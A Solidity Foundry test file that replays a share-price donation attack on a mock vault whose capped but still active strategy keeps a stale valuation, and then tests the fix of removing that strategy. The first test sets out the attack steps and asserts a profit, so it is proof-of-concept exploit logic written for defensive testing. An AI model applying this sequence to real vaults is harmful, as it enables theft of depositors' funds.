// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockToken} from "../../src/MockToken.sol";
import {StaleArk, FleetVault} from "../../src/incidents/FleetVault.sol";

/// Replicates the class of the Lazy Summer incident (July 2026): a donation attack on
/// totalAssets() one level down. The donation goes to a capped-but-not-removed strategy
/// adapter whose stale valuation still feeds the vault's share price.
contract StaleStrategyDonationTest is Test {
    MockToken usdc;
    MockToken siloToken; // the impaired strategy token, worth ~0 but priced at 1.0
    StaleArk ark;
    FleetVault vault;

    address lp = makeAddr("depositors");
    address attacker = makeAddr("attacker");

    function setUp() public {
        usdc = new MockToken();
        siloToken = new MockToken();
        vault = new FleetVault(usdc);
        ark = new StaleArk(siloToken, 1e18); // stale: 1 silo token = 1 USDC
        vault.addArk(ark);

        // 30M USDC of honest deposits sitting in the buffer.
        usdc.mint(lp, 30_000_000e18);
        vm.startPrank(lp);
        usdc.approve(address(vault), type(uint256).max);
        vault.deposit(30_000_000e18, lp);
        vm.stopPrank();

        // Offboarding was started but not finished: the ark is capped, still active.
        vault.capArk(0);

        // Attacker: 60M USDC (flash-loanable, same transaction) and 6M impaired tokens
        // accumulated cheaply over months.
        usdc.mint(attacker, 60_000_000e18);
        siloToken.mint(attacker, 6_000_000e18);
    }

    function test_cappedArk_stillCounts_donationInflatesPrice() public {
        vm.startPrank(attacker);
        usdc.approve(address(vault), type(uint256).max);
        uint256 shares = vault.deposit(60_000_000e18, attacker);
        uint256 priceBefore = vault.convertToAssets(1e18);

        // Donate the impaired tokens straight to the capped ark. No shares minted.
        siloToken.transfer(address(ark), 6_000_000e18);
        uint256 priceAfter = vault.convertToAssets(1e18);

        // Redeem against the inflated price. Payout comes from the USDC buffer.
        uint256 out = vault.redeem(shares, attacker, attacker);
        vm.stopPrank();

        console2.log("share price before (1e18 = 1)", priceBefore);
        console2.log("share price after            ", priceAfter);
        console2.log("attacker USDC in             ", uint256(60_000_000e18));
        console2.log("attacker USDC out            ", out);
        assertGt(priceAfter, priceBefore);
        assertGt(out, 60_000_000e18, "attacker redeemed more USDC than deposited");
        console2.log("attacker profit (USDC wei)   ", out - 60_000_000e18);
    }

    /// The fix: remove the ark from the active set instead of capping it.
    function test_removedArk_donationIsIgnored() public {
        vault.removeArk(0);

        vm.startPrank(attacker);
        usdc.approve(address(vault), type(uint256).max);
        uint256 shares = vault.deposit(60_000_000e18, attacker);
        siloToken.transfer(address(ark), 6_000_000e18);
        uint256 out = vault.redeem(shares, attacker, attacker);
        vm.stopPrank();

        assertLe(out, 60_000_000e18, "no profit once the ark is out of totalAssets()");
    }
}
